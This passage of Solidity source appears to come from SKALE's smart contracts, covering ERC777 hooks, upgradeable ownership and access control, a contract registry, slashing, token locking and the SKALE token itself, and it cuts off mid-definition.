amount);\n\n    }\n\n\n\n    /**\n\n     * @dev See {ERC20-_approve}.\n\n     *\n\n     * Note that accounts cannot have allowance issued by their operators.\n\n     */\n\n    function _approve(address holder, address spender, uint256 value) internal {\n\n        require(holder != address(0), "ERC777: approve from the zero address");\n\n        require(spender != address(0), "ERC777: approve to the zero address");\n\n\n\n        _allowances[holder][spender] = value;\n\n        emit Approval(holder, spender, value);\n\n    }\n\n\n\n    /**\n\n     * @dev Call from.tokensToSend() if the interface is registered\n\n     * @param operator address operator requesting the transfer\n\n     * @param from address token holder address\n\n     * @param to address recipient address\n\n     * @param amount uint256 amount of tokens to transfer\n\n     * @param userData bytes extra information provided by the token holder (if any)\n\n     * @param operatorData bytes extra information provided by the operator (if any)\n\n     */\n\n    function _callTokensToSend(\n\n        address operator,\n\n        address from,\n\n        address to,\n\n        uint256 amount,\n\n        bytes memory userData,\n\n        bytes memory operatorData\n\n    )\n\n        /* Chaged by SKALE from private */ internal /* End of changed by SKALE */\n\n        /* Added by SKALE */ virtual /* End of added by SKALE */\n\n    {\n\n        address implementer = _ERC1820_REGISTRY.getInterfaceImplementer(from, _TOKENS_SENDER_INTERFACE_HASH);\n\n        if (implementer != address(0)) {\n\n            IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData);\n\n        }\n\n    }\n\n\n\n    /**\n\n     * @dev Call to.tokensReceived() if the interface is registered. Reverts if the recipient is a contract but\n\n     * tokensReceived() was not registered for the recipient\n\n     * @param operator address operator requesting the transfer\n\n     * @param from address token holder address\n\n     * @param to address recipient address\n\n     * @param amount uint256 amount of tokens to transfer\n\n     * @param userData bytes extra information provided by the token holder (if any)\n\n     * @param operatorData bytes extra information provided by the operator (if any)\n\n     * @param requireReceptionAck if true, contract recipients are required to implement ERC777TokensRecipient\n\n     */\n\n    function _callTokensReceived(\n\n        address operator,\n\n        address from,\n\n        address to,\n\n        uint256 amount,\n\n        bytes memory userData,\n\n        bytes memory operatorData,\n\n        bool requireReceptionAck\n\n    )\n\n        /* Chaged by SKALE from private */ internal /* End of changed by SKALE */\n\n        /* Added by SKALE */ virtual /* End of added by SKALE */\n\n    {\n\n        address implementer = _ERC1820_REGISTRY.getInterfaceImplementer(to, _TOKENS_RECIPIENT_INTERFACE_HASH);\n\n        if (implementer != address(0)) {\n\n            IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData);\n\n        } else if (requireReceptionAck) {\n\n            require(!to.isContract(), "ERC777: token recipient contract has no implementer for ERC777TokensRecipient");\n\n        }\n\n    }\n\n\n\n    /**\n\n     * @dev Hook that is called before any token transfer. This includes\n\n     * calls to {send}, {transfer}, {operatorSend}, minting and burning.\n\n     *\n\n     * Calling conditions:\n\n     *\n\n     * - when `from` and `to` are both non-zero, ``from``\'s `tokenId` will be\n\n     * transferred to `to`.\n\n     * - when `from` is zero, `tokenId` will be minted for `to`.\n\n     * - when `to` is zero, ``from``\'s `tokenId` will be burned.\n\n     * - `from` and `to` are never both zero.\n\n     *\n\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n\n     */\n\n    function _beforeTokenTransfer(address operator, address from, address to, uint256 tokenId) internal virtual { }\n\n}\n\ncontract ContextUpgradeSafe is Initializable {\n\n    // Empty internal constructor, to prevent people from mistakenly deploying\n\n    // an instance of this contract, which should be used via inheritance.\n\n\n\n    function __Context_init() internal initializer {\n\n        __Context_init_unchained();\n\n    }\n\n\n\n    function __Context_init_unchained() internal initializer {\n\n\n\n\n\n    }\n\n\n\n\n\n    function _msgSender() internal view virtual returns (address payable) {\n\n        return msg.sender;\n\n    }\n\n\n\n    function _msgData() internal view virtual returns (bytes memory) {\n\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n\n        return msg.data;\n\n    }\n\n\n\n    uint256[50] private __gap;\n\n}\n\ncontract OwnableUpgradeSafe is Initializable, ContextUpgradeSafe {\n\n    address private _owner;\n\n\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n\n\n    /**\n\n     * @dev Initializes the contract setting the deployer as the initial owner.\n\n     */\n\n\n\n    function __Ownable_init() internal initializer {\n\n        __Context_init_unchained();\n\n        __Ownable_init_unchained();\n\n    }\n\n\n\n    function __Ownable_init_unchained() internal initializer {\n\n\n\n\n\n        address msgSender = _msgSender();\n\n        _owner = msgSender;\n\n        emit OwnershipTransferred(address(0), msgSender);\n\n\n\n    }\n\n\n\n\n\n    /**\n\n     * @dev Returns the address of the current owner.\n\n     */\n\n    function owner() public view returns (address) {\n\n        return _owner;\n\n    }\n\n\n\n    /**\n\n     * @dev Throws if called by any account other than the owner.\n\n     */\n\n    modifier onlyOwner() {\n\n        require(_owner == _msgSender(), "Ownable: caller is not the owner");\n\n        _;\n\n    }\n\n\n\n    /**\n\n     * @dev Leaves the contract without owner. It will not be possible to call\n\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n\n     *\n\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n\n     * thereby removing any functionality that is only available to the owner.\n\n     */\n\n    function renounceOwnership() public virtual onlyOwner {\n\n        emit OwnershipTransferred(_owner, address(0));\n\n        _owner = address(0);\n\n    }\n\n\n\n    /**\n\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n\n     * Can only be called by the current owner.\n\n     */\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n\n        require(newOwner != address(0), "Ownable: new owner is the zero address");\n\n        emit OwnershipTransferred(_owner, newOwner);\n\n        _owner = newOwner;\n\n    }\n\n\n\n    uint256[49] private __gap;\n\n}\n\ncontract ContractManager is OwnableUpgradeSafe {\n\n    using StringUtils for string;\n\n    using Address for address;\n\n\n\n    // mapping of actual smart contracts addresses\n\n    mapping (bytes32 => address) public contracts;\n\n\n\n    event ContractUpgraded(string contractsName, address contractsAddress);\n\n\n\n    function initialize() external initializer {\n\n        OwnableUpgradeSafe.__Ownable_init();\n\n    }\n\n\n\n    /**\n\n     * Adds actual contract to mapping of actual contract addresses\n\n     * @param contractsName - contracts name in skale manager system\n\n     * @param newContractsAddress - contracts address in skale manager system\n\n     */\n\n    function setContractsAddress(string calldata contractsName, address newContractsAddress) external onlyOwner {\n\n        // check newContractsAddress is not equal to zero\n\n        require(newContractsAddress != address(0), "New address is equal zero");\n\n        // create hash of contractsName\n\n        bytes32 contractId = keccak256(abi.encodePacked(contractsName));\n\n        // check newContractsAddress is not equal the previous contract\'s address\n\n        require(contracts[contractId] != newContractsAddress, "Contract is already added");\n\n        require(newContractsAddress.isContract(), "Given contracts address does not contain code");\n\n        // add newContractsAddress to mapping of actual contract addresses\n\n        contracts[contractId] = newContractsAddress;\n\n        emit ContractUpgraded(contractsName, newContractsAddress);\n\n    }\n\n\n\n    function getContract(string calldata name) external view returns (address contractAddress) {\n\n        contractAddress = contracts[keccak256(abi.encodePacked(name))];\n\n        require(contractAddress != address(0), name.strConcat(" contract has not been found"));\n\n    }\n\n}\n\nabstract contract AccessControlUpgradeSafe is Initializable, ContextUpgradeSafe {\n\n    function __AccessControl_init() internal initializer {\n\n        __Context_init_unchained();\n\n        __AccessControl_init_unchained();\n\n    }\n\n\n\n    function __AccessControl_init_unchained() internal initializer {\n\n\n\n\n\n    }\n\n\n\n    using EnumerableSet for EnumerableSet.AddressSet;\n\n    using Address for address;\n\n\n\n    struct RoleData {\n\n        EnumerableSet.AddressSet members;\n\n        bytes32 adminRole;\n\n    }\n\n\n\n    mapping (bytes32 => RoleData) private _roles;\n\n\n\n    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;\n\n\n\n    /**\n\n     * @dev Emitted when `account` is granted `role`.\n\n     *\n\n     * `sender` is the account that originated the contract call, an admin role\n\n     * bearer except when using {_setupRole}.\n\n     */\n\n    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);\n\n\n\n    /**\n\n     * @dev Emitted when `account` is revoked `role`.\n\n     *\n\n     * `sender` is the account that originated the contract call:\n\n     *   - if using `revokeRole`, it is the admin role bearer\n\n     *   - if using `renounceRole`, it is the role bearer (i.e. `account`)\n\n     */\n\n    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);\n\n\n\n    /**\n\n     * @dev Returns `true` if `account` has been granted `role`.\n\n     */\n\n    function hasRole(bytes32 role, address account) public view returns (bool) {\n\n        return _roles[role].members.contains(account);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the number of accounts that have `role`. Can be used\n\n     * together with {getRoleMember} to enumerate all bearers of a role.\n\n     */\n\n    function getRoleMemberCount(bytes32 role) public view returns (uint256) {\n\n        return _roles[role].members.length();\n\n    }\n\n\n\n    /**\n\n     * @dev Returns one of the accounts that have `role`. `index` must be a\n\n     * value between 0 and {getRoleMemberCount}, non-inclusive.\n\n     *\n\n     * Role bearers are not sorted in any particular way, and their ordering may\n\n     * change at any point.\n\n     *\n\n     * WARNING: When using {getRoleMember} and {getRoleMemberCount}, make sure\n\n     * you perform all queries on the same block. See the following\n\n     * https://forum.openzeppelin.com/t/iterating-over-elements-on-enumerableset-in-openzeppelin-contracts/2296[forum post]\n\n     * for more information.\n\n     */\n\n    function getRoleMember(bytes32 role, uint256 index) public view returns (address) {\n\n        return _roles[role].members.at(index);\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the admin role that controls `role`. See {grantRole} and\n\n     * {revokeRole}.\n\n     *\n\n     * To change a role\'s admin, use {_setRoleAdmin}.\n\n     */\n\n    function getRoleAdmin(bytes32 role) public view returns (bytes32) {\n\n        return _roles[role].adminRole;\n\n    }\n\n\n\n    /**\n\n     * @dev Grants `role` to `account`.\n\n     *\n\n     * If `account` had not been already granted `role`, emits a {RoleGranted}\n\n     * event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the caller must have ``role``\'s admin role.\n\n     */\n\n    function grantRole(bytes32 role, address account) public virtual {\n\n        require(hasRole(_roles[role].adminRole, _msgSender()), "AccessControl: sender must be an admin to grant");\n\n\n\n        _grantRole(role, account);\n\n    }\n\n\n\n    /**\n\n     * @dev Revokes `role` from `account`.\n\n     *\n\n     * If `account` had been granted `role`, emits a {RoleRevoked} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the caller must have ``role``\'s admin role.\n\n     */\n\n    function revokeRole(bytes32 role, address account) public virtual {\n\n        require(hasRole(_roles[role].adminRole, _msgSender()), "AccessControl: sender must be an admin to revoke");\n\n\n\n        _revokeRole(role, account);\n\n    }\n\n\n\n    /**\n\n     * @dev Revokes `role` from the calling account.\n\n     *\n\n     * Roles are often managed via {grantRole} and {revokeRole}: this function\'s\n\n     * purpose is to provide a mechanism for accounts to lose their privileges\n\n     * if they are compromised (such as when a trusted device is misplaced).\n\n     *\n\n     * If the calling account had been granted `role`, emits a {RoleRevoked}\n\n     * event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the caller must be `account`.\n\n     */\n\n    function renounceRole(bytes32 role, address account) public virtual {\n\n        require(account == _msgSender(), "AccessControl: can only renounce roles for self");\n\n\n\n        _revokeRole(role, account);\n\n    }\n\n\n\n    /**\n\n     * @dev Grants `role` to `account`.\n\n     *\n\n     * If `account` had not been already granted `role`, emits a {RoleGranted}\n\n     * event. Note that unlike {grantRole}, this function doesn\'t perform any\n\n     * checks on the calling account.\n\n     *\n\n     * [WARNING]\n\n     * ====\n\n     * This function should only be called from the constructor when setting\n\n     * up the initial roles for the system.\n\n     *\n\n     * Using this function in any other way is effectively circumventing the admin\n\n     * system imposed by {AccessControl}.\n\n     * ====\n\n     */\n\n    function _setupRole(bytes32 role, address account) internal virtual {\n\n        _grantRole(role, account);\n\n    }\n\n\n\n    /**\n\n     * @dev Sets `adminRole` as ``role``\'s admin role.\n\n     */\n\n    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {\n\n        _roles[role].adminRole = adminRole;\n\n    }\n\n\n\n    function _grantRole(bytes32 role, address account) private {\n\n        if (_roles[role].members.add(account)) {\n\n            emit RoleGranted(role, account, _msgSender());\n\n        }\n\n    }\n\n\n\n    function _revokeRole(bytes32 role, address account) private {\n\n        if (_roles[role].members.remove(account)) {\n\n            emit RoleRevoked(role, account, _msgSender());\n\n        }\n\n    }\n\n\n\n    uint256[49] private __gap;\n\n}\n\ncontract Permissions is AccessControlUpgradeSafe {\n\n    using SafeMath for uint;\n\n    using Address for address;\n\n    \n\n    ContractManager public contractManager;\n\n\n\n    /**\n\n     * @dev Throws if called by any account other than the owner.\n\n     */\n\n    modifier onlyOwner() {\n\n        require(_isOwner(), "Caller is not the owner");\n\n        _;\n\n    }\n\n\n\n    modifier onlyAdmin() {\n\n        require(_isAdmin(msg.sender), "Caller is not an admin");\n\n        _;\n\n    }\n\n\n\n    /**\n\n     * @dev allow - throws if called by any account and contract other than the owner\n\n     * or `contractName` contract\n\n     * @param contractName - human readable name of contract\n\n     */\n\n    modifier allow(string memory contractName) {\n\n        require(\n\n            contractManager.contracts(keccak256(abi.encodePacked(contractName))) == msg.sender || _isOwner(),\n\n            "Message sender is invalid");\n\n        _;\n\n    }\n\n\n\n    modifier allowTwo(string memory contractName1, string memory contractName2) {\n\n        require(\n\n            contractManager.contracts(keccak256(abi.encodePacked(contractName1))) == msg.sender ||\n\n            contractManager.contracts(keccak256(abi.encodePacked(contractName2))) == msg.sender ||\n\n            _isOwner(),\n\n            "Message sender is invalid");\n\n        _;\n\n    }\n\n\n\n    modifier allowThree(string memory contractName1, string memory contractName2, string memory contractName3) {\n\n        require(\n\n            contractManager.contracts(keccak256(abi.encodePacked(contractName1))) == msg.sender ||\n\n            contractManager.contracts(keccak256(abi.encodePacked(contractName2))) == msg.sender ||\n\n            contractManager.contracts(keccak256(abi.encodePacked(contractName3))) == msg.sender ||\n\n            _isOwner(),\n\n            "Message sender is invalid");\n\n        _;\n\n    }\n\n\n\n    function initialize(address contractManagerAddress) public virtual initializer {\n\n        AccessControlUpgradeSafe.__AccessControl_init();\n\n        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);\n\n        _setContractManager(contractManagerAddress);\n\n    }\n\n\n\n    function _isOwner() internal view returns (bool) {\n\n        return hasRole(DEFAULT_ADMIN_ROLE, msg.sender);\n\n    }\n\n\n\n    function _isAdmin(address account) internal view returns (bool) {\n\n        address skaleManagerAddress = contractManager.contracts(keccak256(abi.encodePacked("SkaleManager")));\n\n        if (skaleManagerAddress != address(0)) {\n\n            AccessControlUpgradeSafe skaleManager = AccessControlUpgradeSafe(skaleManagerAddress);\n\n            return skaleManager.hasRole(keccak256("ADMIN_ROLE"), account) || _isOwner();\n\n        } else {\n\n            return _isOwner();\n\n        }\n\n    }\n\n\n\n    function _setContractManager(address contractManagerAddress) private {\n\n        require(contractManagerAddress != address(0), "ContractManager address is not set");\n\n        require(contractManagerAddress.isContract(), "Address is not contract");\n\n        contractManager = ContractManager(contractManagerAddress);\n\n    }\n\n}\n\ncontract Punisher is Permissions, ILocker {\n\n\n\n    /**\n\n     * @dev Emitted when a slashing condition occurs.\n\n     */\n\n    event Slash(\n\n        uint validatorId,\n\n        uint amount\n\n    );\n\n\n\n    /**\n\n     * @dev Emitted when a forgive condition occurs.\n\n     */\n\n    event Forgive(\n\n        address wallet,\n\n        uint amount\n\n    );\n\n\n\n    //        holder => tokens\n\n    mapping (address => uint) private _locked;\n\n\n\n    /**\n\n     * @dev Executes slashing on a validator and its delegations by an `amount`\n\n     * of tokens. Currently, SkaleDKG is the only service allowed to execute\n\n     * slashing.\n\n     *\n\n     * Emits a Slash event.\n\n     *\n\n     * @param validatorId uint validator to be slashed\n\n     * @param amount uint slashed amount\n\n    */\n\n    function slash(uint validatorId, uint amount) external allow("SkaleDKG") {\n\n        ValidatorService validatorService = ValidatorService(contractManager.getContract("ValidatorService"));\n\n        DelegationController delegationController = DelegationController(\n\n            contractManager.getContract("DelegationController"));\n\n\n\n        require(validatorService.validatorExists(validatorId), "Validator does not exist");\n\n\n\n        delegationController.confiscate(validatorId, amount);\n\n\n\n        emit Slash(validatorId, amount);\n\n    }\n\n\n\n    /**\n\n     * @dev Allows the Owner to forgive a slashing condition.\n\n     *\n\n     * Emits a Forgive event.\n\n     *\n\n     * @param holder address of the slashed\n\n     * @param amount uint amount to be forgiven\n\n     */\n\n    function forgive(address holder, uint amount) external onlyAdmin {\n\n        DelegationController delegationController = DelegationController(\n\n            contractManager.getContract("DelegationController"));\n\n\n\n        require(!delegationController.hasUnprocessedSlashes(holder), "Not all slashes were calculated");\n\n\n\n        if (amount > _locked[holder]) {\n\n            delete _locked[holder];\n\n        } else {\n\n            _locked[holder] = _locked[holder].sub(amount);\n\n        }\n\n\n\n        emit Forgive(holder, amount);\n\n    }\n\n\n\n    /**\n\n     * @dev See ILocker-getAndUpdateLockedAmount\n\n     */\n\n    function getAndUpdateLockedAmount(address wallet) external override returns (uint) {\n\n        return _getAndUpdateLockedAmount(wallet);\n\n    }\n\n\n\n    /**\n\n     * @dev See ILocker-getAndUpdateForbiddenForDelegationAmount\n\n     */\n\n    function getAndUpdateForbiddenForDelegationAmount(address wallet) external override returns (uint) {\n\n        return _getAndUpdateLockedAmount(wallet);\n\n    }\n\n\n\n    function handleSlash(address holder, uint amount) external allow("DelegationController") {\n\n        _locked[holder] = _locked[holder].add(amount);\n\n    }\n\n\n\n    function initialize(address contractManagerAddress) public override initializer {\n\n        Permissions.initialize(contractManagerAddress);\n\n    }\n\n\n\n    // private\n\n\n\n    function _getAndUpdateLockedAmount(address wallet) private returns (uint) {\n\n        DelegationController delegationController = DelegationController(\n\n            contractManager.getContract("DelegationController"));\n\n\n\n        delegationController.processAllSlashes(wallet);\n\n        return _locked[wallet];\n\n    }\n\n\n\n}\n\ncontract SkaleToken is ERC777, Permissions, ReentrancyGuard, IDelegatableToken {\n\n    using SafeMath for uint;\n\n\n\n    string public constant NAME = "SKALE";\n\n\n\n    string public constant SYMBOL = "SKL";\n\n\n\n    uint public constant DECIMALS = 18;\n\n\n\n    uint public constant CAP = 7 * 1e9 * (10 ** DECIMALS); // the maximum amount of tokens that can ever be created\n\n\n\n    constructor(address contractsAddress, address[] memory defOps) public\n\n    ERC777("SKALE", "SKL", defOps)\n\n    {\n\n        Permissions.initialize(contractsAddress);\n\n    }\n\n\n\n    /**\n\n     * @dev mint - create some amount of token and transfer it to the specified address\n\n     * @param account - address where some amount of token would be created\n\n     * @param amount - amount of tokens to mine\n\n     * @param userData bytes extra information provided by the token holder (if any)\n\n     * @param operatorData bytes extra information provided by the operator (if any)\n\n     * @return returns success of function call.\n\n     */\n\n    function mint(\n\n        address account,\n\n        uint256 amount,\n\n        bytes calldata userData,\n\n        bytes calldata operatorData\n\n    )\n\n        external\n\n        allow("SkaleManager")\n\n        //onlyAuthorized\n\n        returns (bool)\n\n    {\n\n        require(amount <= CAP.sub(totalSupply()), "Amount is too big");\n\n        _mint(\n\n            account,\n\n            amount,\n\n            userData,\n\n            operatorData\n\n        );\n\n\n\n        return true;\n\n    }\n\n\n\n    function getAndUpdateDelegatedAmount(address wallet) external override returns (uint) {\n\n        return DelegationController(contractManager.getContract("DelegationController"))\n\n            .getAndUpdateDelegatedAmount(wallet);\n\n    }\n\n\n\n    function getAndUpdateSlashedAmount(address wallet) external override returns (uint) {\n\n        return Punisher(contractManager.getContract("Punisher")).getAndUpdateLockedAmount(wallet);\n\n    }\n\n\n\n    function getAndUpdateLockedAmount(address wallet) public override returns (uint) {\n\n        return TokenState(contractManager.getContract("TokenState")).getAndUpdateLockedAmount(wallet);\n\n    }\n\n\n\n    // internal\n\n\n\n    function _beforeTokenTransfer(\n\n        address, // operator\n\n        address from,\n\n        address, // to\n\n        uint256 tokenId)\n\n        internal override\n\n    {\n\n        uint locked = getAndUpdateLockedAmount(from);\n\n        if (locked > 0) {\n\n            require(balanceOf(from) >= locked.add(tokenId), "Token should be unlocked for transferring");\n\n        }\n\n    }\n\n\n\n    function _callTokensToSend(\n\n        address operator,\n\n        address from,\n\n        address to,\n\n        uint256 amount,\n\n        bytes memory userData,\n\n        bytes memory operatorData\n\n    ) internal override nonReentrant {\n\n        super._callTokensToSend(operator, from, to, amount, userData, operatorData);\n\n    }\n\n\n\n    function _callTokensReceived(\n\n        address operator,\n\n        address from,\n\n        address to,\n\n        uint256 amount,\n\n        bytes memory userData,\n\n        bytes memory operatorData,\n\n        bool requireReceptionAck\n\n    ) internal override nonReentrant {\n\n        super._callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);\n\n    }\n\n\n\n    // we have to override _msgData() and _msgSender() functions because of collision in Context and ContextUpgradeSafe\n\n\n\n    function _msgData() internal view override(Context, ContextUpgradeSafe) returns (bytes memory) {\n\n        return Context._msgData();\n\n    }\n\n\n\n    function _msgSender() internal view override(Context, ContextUpgradeSafe) returns (address payable) {\n\n        return Context._msgSender();\n\n    }\n\n}\n\ncontract TokenLaunchLocker is Permissions, ILocker {\n\n    using MathUtils for uint;\n\n    using PartialDifferences for PartialDifferences.Value;\n\n\n\n    /**\n\n     * @dev Emitted when an `amount` is unlocked.\n\n     */\n\n    event Unlocked(\n\n        address holder,\n\n        uint amount\n\n    );\n\n\n\n    /**\n\n     * @dev Emitted when an `amount` is locked.\n\n     */\n\n    event Locked(\n\n        address holder,\n\n        uint amount\n\n    );\n\n\n\n    struct DelegatedAmountAndMonth {\n\n        uint delegated;\n\n        uint month;\n\n    }\n\n\n\n    //        holder => tokens\n\n    mapping (address => uint) private _locked;\n\n\n\n    //        holder => tokens\n\n    mapping (address => PartialDifferences.Value) private _delegatedAmount;\n\n\n\n    mapping (address => DelegatedAmountAndMonth) private _totalDelegatedAmount;\n\n\n\n    // delegationId => tokens\n\n    mapping (uint => uint) private _delegationAmount;\n\n\n\n    function lock(address holder, uint amount) external allow("TokenLaunchManager") {\n\n        _locked[holder] = _locked[holder].add(amount);\n\n\n\n        emit Locked(holder, amount);\n\n    }\n\n\n\n    function handleDelegationAdd(\n\n        address holder, uint delegationId, uint amount, uint month)\n\n        external allow("DelegationController")\n\n    {\n\n        if (_locked[holder] > 0) {\n\n            TimeHelpers timeHelpers = TimeHelpers(contractManager.getContract("TimeHelpers"));\n\n\n\n            uint currentMonth = timeHelpers.getCurrentMonth();\n\n            uint fromLocked = amount;\n\n            uint locked = _locked[holder].boundedSub(_getAndUpdateDelegatedAmount(holder, currentMonth));\n\n            if (fromLocked > locked) {\n\n                fromLocked = locked;\n\n            }\n\n            if (fromLocked > 0) {\n\n                require(_delegationAmount[delegationId] == 0, "Delegation was already added");\n\n                _addToDelegatedAmount(holder, fromLocked, month);\n\n                _addToTotalDelegatedAmount(holder, fromLocked, month);\n\n                _delegationAmount[delegationId] = fromLocked;\n\n            }\n\n        }\n\n    }\n\n\n\n    function handleDelegationRemoving(\n\n        address holder,\n\n        uint delegationId,\n\n        uint month)\n\n        external allow("DelegationController")\n\n    {\n\n        if (_delegationAmount[delegationId] > 0) {\n\n            if (_locked[holder] > 0) {\n\n                _removeFromDelegatedAmount(holder, _delegationAmount[delegationId], month);\n\n            }\n\n            delete _delegationAmount[delegationId];\n\n        }\n\n    }\n\n\n\n    function getAndUpdateLockedAmount(address wallet) external override returns (uint) {\n\n        if (_locked[wallet] > 0) {\n\n            DelegationController delegationController = DelegationController(\n\n                contractManager.getContract("DelegationController"));\n\n            TimeHelpers timeHelpers = TimeHelpers(contractManager.getContract("TimeHelpers"));\n\n            ConstantsHolder constantsHolder = ConstantsHolder(contractManager.getContract("ConstantsHolder"));\n\n\n\n            uint currentMonth = timeHelpers.getCurrentMonth();\n\n            if (_totalDelegatedSatisfiesProofOfUserCondition(wallet) &&\n\n                timeHelpers.calculateProofOfUseLockEndTime(\n\n                    _totalDelegatedAmount[wallet].month,\n\n                    constantsHolder.proofOfUseLockUpPeriodDays()\n\n                ) <= now) {\n\n                _unlock(wallet);\n\n                return 0;\n\n            } else {\n\n                uint lockedByDelegationController = _getAndUpdateDelegatedAmount(wallet, currentMonth)\n\n                    .add(delegationController.getLockedInPendingDelegations(wallet));\n\n                if (_locked[wallet] > lockedByDelegationController) {\n\n                    return _locked[wallet].boundedSub(lockedByDelegationController);\n\n                } else {\n\n                    return 0;\n\n                }\n\n            }\n\n        } else {\n\n            return 0;\n\n        }\n\n    }\n\n\n\n    function getAndUpdateForbiddenForDelegationAmount(address) external override returns (uint) {\n\n        return 0;\n\n    }\n\n\n\n    function initialize(address contractManagerAddress) public override initializer {\n\n        Permissions.initialize(contractManagerAddress);\n\n    }\n\n\n\n    // private\n\n\n\n    function _getAndUpdateDelegatedAmount(address holder, uint currentMonth) private returns (uint) {\n\n        return _delegatedAmount[holder].getAndUpdateValue(currentMonth);\n\n    }\n\n\n\n    function _addToDelegatedAmount(address holder, uint amount, uint month) private {\n\n        _delegatedAmount[holder].addToValue(amount, month);\n\n    }\n\n\n\n    function _removeFromDelegatedAmount(address holder, uint amount, uint month) private {\n\n        _delegatedAmount[holder].subtractFromValue(amount, month);\n\n    }\n\n\n\n    function _addToTotalDelegatedAmount(address holder, uint amount, uint month) private {\n\n        require(\n\n            _totalDelegatedAmount[holder].month == 0 || _totalDelegatedAmount[holder].month <= month,\n\n            "Can\'t add to total delegated in the past");\n\n\n\n        // do not update counter if it is big enough\n\n        // because it will override month value\n\n        if (!_totalDelegatedSatisfiesProofOfUserCondition(holder)) {\n\n            _totalDelegatedAmount[holder].delegated = _totalDelegatedAmount[holder].delegated.add(amount);\n\n            _totalDelegatedAmount[holder].month = month;\n\n        }\n\n    }\n\n\n\n    function _unlock(address holder) private {\n\n        emit Unlocked(holder, _locked[holder]);\n\n        delete _locked[holder];\n\n        _deleteDelegatedAmount(holder);\n\n        _deleteTotalDelegatedAmount(holder);\n\n    }\n\n\n\n    function _deleteDelegatedAmount(address holder) private {\n\n        _delegatedAmount[holder].clear();\n\n    }\n\n\n\n    function _deleteTotalDelegatedAmount(address holder) private {\n\n        delete _totalDelegatedAmount[holder].delegated;\n\n        delete _totalDelegatedAmount[holder].month;\n\n    }\n\n\n\n    function _totalDelegatedSatisfiesProofOfUserCondition(address holder) private view returns (bool) {\n\n        ConstantsHolder constantsHolder = ConstantsHolder(contractManager.getContract("ConstantsHolder"));\n\n\n\n        return _totalDelegatedAmount[holder].delegated.mul(100) >=\n\n            _locked[holder].mul(constantsHolder.proofOfUseDelegationPercentage());\n\n    }\n\n}\n\ncontract TokenState is Permissions, ILocker {\n\n\n\n    /**\n\n     * @dev Emitted when a contract is added to the locker.\n\n     */\n\n    event LockerWasAdded(\n\n        string locker\n\n    );\n\n\n\n    /**\n\n     * @dev Emitted when a contract is removed from the locker.\n\n     */\n\n    event LockerWasRemoved(\n\n        string locker\n\n    );\n\n\n\n    string[] private _lockers;\n\n\n\n    /**\n\n     *  @dev Return and update the total locked amount of a given `holder`.\n\n     *\n\n     *  @param holder address of the token holder\n\n     *  @return total locked amount\n\n    */\n\n    function getAndUpdateLockedAmount(address holder) external override returns (uint) {\n\n        uint locked = 0;\n\n        for (uint i = 0; i < _lockers.length; ++i) {\n\n            ILocker locker = ILocker(contractManager.getContract(_lockers[i]));\n\n            locked = locked.add(locker.getAndUpdateLockedAmount(holder));\n\n        }\n\n        return locked;\n\n    }\n\n\n\n    /**\n\n     * @dev Return and update the total locked and un-delegatable amount of a given `holder`.\n\n     *\n\n     * @param holder address of the token holder\n\n     * @return amount total slashed amount (non-transferable and non-delegatable)\n\n    */\n\n    function getAndUpdateForbiddenForDelegationAmount(address holder) external override returns (uint amount) {\n\n        uint forbidden = 0;\n\n        for (uint i = 0; i < _lockers.length; ++i) {\n\n            ILocker locker = ILocker(contractManager.getContract(_lockers[i]));\n\n            forbidden = forbidden.add(locker.getAndUpdateForbiddenForDelegationAmount(holder));\n\n        }\n\n        return forbidden;\n\n    }\n\n\n\n    /**\n\n     * @dev Allows the Owner to remove a contract from the locker.\n\n     *\n\n     * Emits a LockerWasRemoved event.\n\n     *\n\n     * @param locker string name of contract to remove from locker\n\n     */\n\n    function removeLocker(string calldata locker) external onlyOwner {\n\n        uint index;\n\n        bytes32 hash = keccak256(abi.encodePacked(locker));\n\n        for (index = 0; index < _lockers.length; ++index) {\n\n            if (keccak256(abi.encodePacked(_lockers[index])) == hash) {\n\n                break;\n\n            }\n\n        }\n\n        if (index < _lockers.length) {\n\n            if (index < _lockers.length.sub(1)) {\n\n                _lockers[index] = _lockers[_lockers.length.sub(1)];\n\n            }\n\n            delete _lockers[_lockers.length.sub(1)];\n\n            _lockers.pop();\n\n            emit LockerWasRemoved(locker);\n\n        }\n\n    }\n\n\n\n    function initialize(address contractManagerAddress) public override initializer {\n\n        Permissions.initialize(contractManagerAddress);\n\n        addLocker("DelegationController");\n\n        addLocker("Punisher");\n\n        addLocker("TokenLaunchLocker");\n\n    }\n\n\n\n    /**\n\n     * @dev Allows the Owner to add a contract to the Locker.\n\n     *\n\n     * Emits a LockerWasAdded event.\n\n     *\n\n     * @param locker string name of contract to add to locker\n\n     */\n\n    function addLocker(string memory locker) public onlyOwner {\n\n        _lockers.push(locker);\n\n        emit LockerWasAdded(locker);\n\n    }\n\n}\n\ncontract ValidatorService is Permissions {\n\n\n\n    using ECDSA for bytes32;\n\n\n\n    struct Validator {\n\n        string name;\n\n        address validatorAddress;\n\n        address requestedAddress;\n\n        string description;\n\n        uint feeRate;\n\n        uint registrationTime;\n\n        uint minimumDelegationAmount;\n\n        bool acceptNewRequests;\n\n    }\n\n\n\n    /**\n\n     * @dev Emitted when a validator registers.\n\n     */\n\n    event ValidatorRegistered(\n\n        uint validatorId\n\n    );\n\n\n\n    /**\n\n     * @dev Emitted when a validator address changes.\n\n     */\n\n    event ValidatorAddressChanged(\n\n        uint validatorId,\n\n        address newAddress\n\n    );\n\n\n\n    event ValidatorWasEnabled(\n\n   